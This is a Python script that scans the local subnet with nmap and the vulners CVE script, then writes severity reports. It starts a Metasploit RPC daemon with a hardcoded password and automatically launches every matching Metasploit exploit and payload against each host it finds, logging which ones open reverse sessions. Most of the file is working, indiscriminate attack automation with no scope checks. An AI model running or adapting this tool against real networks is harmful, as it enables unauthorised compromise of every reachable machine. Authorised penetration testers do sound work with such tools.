import nmap
import socket
import struct
import os
import ipaddress
import re
import random, string
from datetime import datetime
import netifaces
import platform
import sys
import time
from pymetasploit3.msfrpc import *
import pandas as pd
import csv
from io import StringIO

startTime = datetime.now()
# save the cwd for use later
startDir = os.path.dirname(os.path.realpath(sys.argv[0]))


# Open file for writing our output and create if its not created already
f = open(startDir + "/overview.txt","a+")

# get host IP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
	# doesn't even have to be reachable
	s.connect(('10.255.255.255', 1))
	IP = s.getsockname()[0]
except:
	IP = '127.0.0.1'
finally:
	s.close()

# get OS platform for deciding code to run later if needed
operatingSystem = platform.system()
nm = nmap.PortScanner()

f.write('Begin Script @ {0} \n\n'.format(startTime))
f.write('------ Your Host ------\n')
f.write('Host IP: {0} \n'.format(IP))

# Cross Platform way to get the following info about our machine
for i in netifaces.interfaces():
   try:
      if netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("192") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("10") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("172"):
         f.write("Operating System: {0} \n".format(platform.system()))
         netmask = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['netmask']
         f.write("Network Mask: {0} \n".format(netmask))
         f.write("Gateway IP: {0} \n".format(netifaces.gateways()['default'][netifaces.AF_INET][0]))
         break
      else:
         pass
   except:
	   pass

# Creates an ipaddress object that is used to hold all of the IPs on the subnet
subnet = ipaddress.ip_network(u'{0}/{1}'.format(IP, netmask),strict=False)

# Just a prompt for the output file
f.write('\nInitiating quick scan from host {0} to {1} \n'.format(subnet[0], subnet[-1]))


# NMAP subnet excluding our IP #
## make -Pn, -F, and speed (-T#) switch for during the run
nm.scan(hosts=str(subnet), arguments='-O -sV -T4 -Pn --script vulners --exclude ' + IP)

hostsCount = len(nm.all_hosts())
hostObjects = []
f.write("Count of alive hosts: {0}\n".format(hostsCount))
f2 = open("IPList.txt","a+")
f2.write('\n'.join(map(str,nm.all_hosts())))
f2.close()

f3 = open(startDir + "/serviceDetails.txt","a+")
f4 = open(startDir + "/cveDetails.txt","a+")

# start at lport 49152 for modules to use (to be incremented later)
lport = 49152

# '/' is not platform independant and neither is 'cd' #
def findModules(service, details, port, host):
    print("testing port:" + str(port) + " for host: " + host)
    hostDir = host.replace(".","-")
    fullPath = os.path.join(startDir, hostDir) # where we want to be
    fullPathCMD = 'cd ' + fullPath
    outFile = service + str(port) + '.csv'
    console.write(fullPathCMD) # make sure we go to right directory first
    while console.is_busy() == True:
        time.sleep(1)
	# what we want to search msfconsole for now that in right directory
    search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
    try:
        console.write(search) # actually perform the search for modules and store the output
        while console.is_busy() == True:
            time.sleep(1)
        pathToFile = os.path.join(fullPath, outFile)
        if os.path.exists(pathToFile) == True:
        	while not os.access(pathToFile, os.R_OK | os.W_OK):
        		print("   Hmmm file may be locked. Re-trying...")
        		time.sleep(1)
        else:
        	print("  " + str(pathToFile) + " could not be located.")
        	return "error"
        return pathToFile
    except Exception as e:
        print("  error with search: " + str(e))
        return "error"


def exploitHost(host):
	hostSessions = len(client.sessions.list)
	countMSMod = 0
	exploitObjects = []
	try:
		hostDir = host.replace(".","-")
		os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + hostDir)
	except Exception as e:
		print(e)
	for port in nm[host]['tcp'].keys():
		dfLen = 0
		service = str(nm[host]['tcp'][port]['name'])
		details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
		exploitFilePath = findModules(service, details, port, host)
		if exploitFilePath == "error":
			print("  No file returned from called method.")
		else:
			if os.path.exists(exploitFilePath) == True:
				while not os.access(exploitFilePath, os.R_OK | os.W_OK):
					print("   Hmmm file may be locked. Re-trying...")
					time.sleep(1)
			else:
				print("   File could not be found.")
				break
			# initial read of file
			with open(exploitFilePath) as csvfile:
				readCSV = csvfile.read()
				df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
			dfLen = len(df.index)
			if dfLen == 0: # if the file was read but says no modules
				if os.stat(exploitFilePath).st_size > 46: # files with modules should be > 46 so we shoudnt be having problems... PANDAS
					print("  ****** why is df size 0! *******")
					time.sleep(1)
					df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try one more time
					dfLen = len(df.index) # should be greater than 0 - modules will run after above print is made if this worked
				else: # file was read, dfLen is 0, and file size is small so probably correct
					dfLen = 0
					print("  No modules found")
			# except Exception as e:
			# 	if "does not exist" in str(e):
			# 		# lets make sure it actually doesnt exist and not just a pandas issue..
			# 		count = 0
			# 		while count < 3:
			# 			try:
			# 				print("  File was not found. Secondary attempt (" + str(count+1) + "/3)")
			# 				df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
			# 				dfLen = len(df.index)
			# 				if dfLen == 0: # pandas found the file, now but says no modules so lets test it
			# 					if os.stat(filePath).st_== size > 46: # size should be > 46 if contains any modules so try pandas read again
			# 						print("  ****** why is df size 0! (second) *******")
			# 						time.sleep(2)
			# 						df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try pandas read again
			# 						dfLen = len(df.index) # should be > 0 - modules will run after aove print is made if this worked
			# 					else:
			# 						print("  file size: " + str(os.stat(filePath).st_size)) # file has no modules
			# 						dfLen = 0
			# 						count = 4
			# 				count = 6 # exit the "getting a file not found" loop becasue it was found. The file may or may not have data though
			# 			except:
			# 				count += 1 # this will try 3 times if pandas keeps saying file does not exist
			# 		if count == 3: # got 3 file not founds so giving up
			# 			print("  MSF file could not be found by pandas.")
			# 			dfLen = 0
			# 	else: # some other error occured
			# 		print(e)
			# 		dfLen = 0

			else:
				countMSMod = countMSMod + dfLen
				for index, row in df.iterrows():
					global lport
					lport += 1 # increment lport so that modules arent trying to use the same lport
					exploitName = row['Name'][8:]
					print("  Attempting module: " + exploitName)
					exploit2 = client.modules.use('exploit', exploitName)
					if len(exploit2.targetpayloads()[0]) >= 1:
						try: # set remote host
							exploit2['RHOSTS'] = host
						except:
							try:
								exploit2['RHOST'] = host
							except:
								pass
						try: # set port number
							exploit2['RPORT'] = port
						except:
							try:
								exploit2['RPORTS'] = port
							except:
								pass

						if len(exploit2.missing_required) > 0:
							for item in exploit2.missing_required:
								print("    Item not set: " + item)
							print("    Exiting exploit: " + exploitName)
							break

						failedToRun = True
						i = 0
						while i <= len(exploit2.targetpayloads())-1:
							try:
								payload = exploit2.targetpayloads()[i]
								payloadObj = client.modules.use('payload', payload)
								try: # set remote host
									payloadObj['RHOSTS'] = host
								except:
									try:
										payloadObj['RHOST'] = host
									except:
										pass
								try: # set port number
									payloadObj['RPORT'] = port
								except:
									try:
										payloadObj['RPORTS'] = port
									except:
										pass
								try: # set port number
									payloadObj['LPORT'] = lport
								except:
									try:
										payloadObj['LPORTS'] = lport
									except:
										pass
								try: # set port number
									payloadObj['LHOST'] = IP
								except:
									try:
										payloadObj['LHOST'] = IP
									except:
										pass
								print("    Setting payload: " + payload)
								if len(payloadObj.missing_required) > 0:
									for item in payloadObj.missing_required:
										print("      Item not set: " + item)
									print("      Exiting payload: " + payload)
									break

								exploit2.execute(payload=payloadObj)
								i += 1
								result = 'Fail'

								hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
								exploitObjects.append(hostExploits)
								#failedToRun = False
							except:
								i += 1

						result = 'Fail'

						# hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
						# exploitObjects.append(hostExploits)
					else:
						print("  No payload selected for: " + exploitName)
			# else:
			# 	print("  No modules found") # No modules found for this service / port

	# check that all modules (jobs) are complete
	sleepCount = 0
	while len(client.jobs.list) > 0 and sleepCount < 30:
		print("There are: " + str(len(client.jobs.list)) + " jobs remaining.")
		time.sleep(1)
		sleepCount += 1

	for job in client.jobs.list:
		client.jobs.stop(job)


	for index in client.sessions.list:
		for item in exploitObjects:
			if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]):
				item['Result'] = 'Success'

	try:
		outDir = host.replace(".","-")
		csv_file = outDir + '/exploits.csv'
		with open(csv_file, 'w') as csvfile:
			writer = csv.DictWriter(csvfile, fieldnames = ["IP", "Service", "Port", "Exploit", "Payload", "Result"])
			writer.writeheader()
			for x in exploitObjects:
				writer.writerow(x)

	except Exception as e:
		print(e)

	hostSessions = len(client.sessions.list)-hostSessions
	return countMSMod, str(hostSessions)


for host in nm.all_hosts():
	cveCount = 0 # get len(tabs) / 3 for each port and add to cveCount
	topCVEscore = -1 # Highest CVE score for the system used to determine severity level
	severity = 'Inconclusive' # System vulnerability status based on highest CVE score between all services
	severityNum = 0 # map severity to a number 0-4 for ordering systems
	countCritical = 0 # total number of CVEs that fall in that severity level
	countHigh = 0 # total number of CVEs that fall in that severity level
	countMedium = 0 # total number of CVEs that fall in that severity level
	countLow = 0 # total number of CVEs that fall in that severity level
	countNone = 0 # total number of CVEs that fall in that severity level
	countNoCVEports = 0 # used to determine when to print "No CVEs for this host." (ie when no servies found or no CVEs found)

	try:
		OS = nm[host]['osmatch'][0]['name']
	except:
		 OS = 'No OS Found'
	f3.write("\nIP: {0}".format(host))
	f4.write("IP: {0}\n".format(host))
	try:
		f3.write("\nPort    Service                  Details")
		for port in nm[host]['tcp'].keys():
			serviceFull = str(port).ljust(8," ") + nm[host]['tcp'][port]['name'].ljust(25, " ") + nm[host]['tcp'][port]['product'] + " " + nm[host]['tcp'][port]['version']
			try:
				nm[host]['tcp'][port]['script']['vulners']
				f4.write("  Port: " + str(port))
			except:
				pass
			f3.write('\n\t' + serviceFull)
			try:
				tabs = []
				cveScoreList = []
				start = 1

				for m in re.finditer('\t', nm[host]['tcp'][port]['script']['vulners']):
					tabs.append(m.start())
				cveCount = cveCount + (len(tabs) / 3)
				currentCVEscore = float(nm[host]['tcp'][port]['script']['vulners'][tabs[1]+1:tabs[1]+2])
				if currentCVEscore > topCVEscore:
					topCVEscore = currentCVEscore
				while start <= len(tabs)-2:
					cveScoreList.append(float(nm[host]['tcp'][port]['script']['vulners'][tabs[start]+1:tabs[start+1]]))
					start += 3

				for score in cveScoreList:
					if currentCVEscore == 0:
						countNone += 1
					elif currentCVEscore >= 0.1 and currentCVEscore <=  3.9:
						countLow += 1
					elif currentCVEscore >= 4.0 and currentCVEscore <=  6.9:
						countMedium += 1
					elif currentCVEscore >= 7.0 and currentCVEscore <=  8.9:
						countHigh += 1
					elif currentCVEscore >= 9.0 and currentCVEscore <=  10:
						countCritical += 1

				### Use this if you want to print CVE details for each service ###
				try:
					f4.write('        ' + nm[host]['tcp'][port]['script']['vulners'] + '\n\n')
				except:
					pass
			except:
				countNoCVEports += 1
				if countNoCVEports == len(nm[host]['tcp'].keys()):
					f4.write("  No CVEs for this host.\n\n")
				else:
					pass
	except:
		f3.write("\n\tNo Services for this host.\n")
		f4.write("No CVEs for this host.\n")

	if topCVEscore == -1:
		severity = 'Inconclusive'
		severityNum = -1
	elif topCVEscore == 0:
		severity = 'None'
		severityNum = 0
	elif topCVEscore >= 0.1 and topCVEscore <=  3.9:
		severity = 'Low'
		severityNum = 1
	elif topCVEscore >= 4.0 and topCVEscore <=  6.9:
		severity = 'Medium'
		severityNum = 2
	elif topCVEscore >= 7.0 and topCVEscore <=  8.9:
		severity = 'High'
		severityNum = 3
	elif topCVEscore >= 9.0 and topCVEscore <=  10:
		severity = 'Critical'
		severityNum = 4

	thisHost = {"IP":host, "Severity":severity, "SeverityNum":severityNum, "Criticals":countCritical, "Highs":countHigh, "Mediums":countMedium, "Lows":countLow, "Nones":countNone, "CVECount":cveCount, "MSTested":0, "MSSessions":0, "OS":OS}
	hostObjects.append(thisHost)
f3.close()

hostObjects.sort(key = lambda l: (l["SeverityNum"], l["Criticals"], l["Highs"], l["Mediums"], l["Lows"], l["Nones"]), reverse = True)
printed4 = False
printed3 = False
printed2 = False
printed1 = False
printed0 = False
printedNeg = False


# start msf remote api
os.system("msfrpcd -P testpw -S")
time.sleep(5) # pause for the service to fully start
client = MsfRpcClient('testpw', port=55553, ssl=False) # make connection

cid = client.consoles.console().cid # create console and get Id
console = client.consoles.console(cid)



for sys in hostObjects:
	msTested, msSessions = exploitHost(sys["IP"])
	sys["MSTested"] = msTested
	sys["MSSessions"] = msSessions
	if sys["SeverityNum"] == 4:
		if printed4 == False:
			printed4 = True
			f.write("\n--- Vulnerability Level: Critical ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["MSTested"], sys["MSSessions"]))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 3:
		if printed3 == False:
			printed3 = True
			f.write("\n--- Vulnerability Level: High ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 2:
		if printed2 == False:
			printed2 = True
			f.write("\n--- Vulnerability Level: Medium ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 1:
		if printed1 == False:
			printed1 = True
			f.write("\n--- Vulnerability Level: Low ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 0:
		if printed0 == False:
			printed0 = True
			f.write("\n--- Vulnerability Level: None ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == -1:
		if printedNeg  == False:
			printedNeg = True
			f.write("\n--- Vulnerability Level: Inconclusive ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))


endTime = datetime.now()
runtime = endTime-startTime
os.system("killall ruby")
f.write('\n\n End Script @ {0}    ---   Total Runtime: {1}'.format(endTime, runtime))
f.close()
